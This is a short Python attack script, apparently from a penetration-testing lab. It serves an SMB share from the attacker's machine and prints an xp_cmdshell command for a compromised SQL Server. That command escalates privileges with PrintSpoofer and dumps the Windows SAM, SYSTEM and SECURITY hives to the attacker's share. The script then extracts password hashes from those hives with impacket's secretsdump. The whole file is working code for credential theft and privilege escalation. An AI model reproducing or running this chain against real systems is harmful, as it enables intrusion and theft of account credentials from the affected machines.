from payload import SamDumpPowershell, PrintSpoofer, PowershellRunner
from tempsmbserver import TempSMB
from stolen_from_impacket.secretsdump import dump

local_ip = "192.168.56.106"
print_spoofer = True

with TempSMB(local_ip=local_ip) as smb:
    sam_dump_payload = SamDumpPowershell(smb)
    if print_spoofer:
        print_spoofer_file = smb.create_temp_file_from_file("/home/kali/potatos/PrintSpoofer64.exe")
        print_spoofer_payload = PrintSpoofer(smb, input_files=[print_spoofer_file, sam_dump_payload.file])
        runner_payload = PowershellRunner(smb, [print_spoofer_payload.file])
    else:
        runner_payload = PowershellRunner(smb, [sam_dump_payload.file])

    print("ANGRY SMB READY:")
    print(f"xp_cmdshell {runner_payload.payload}")
    sam_dump_payload.await_output_files()

    print("="*10 + "secretsdump" + "="*10)
    dump(sam_dump_payload.sam.local_path, sam_dump_payload.system.local_path, sam_dump_payload.security.local_path)
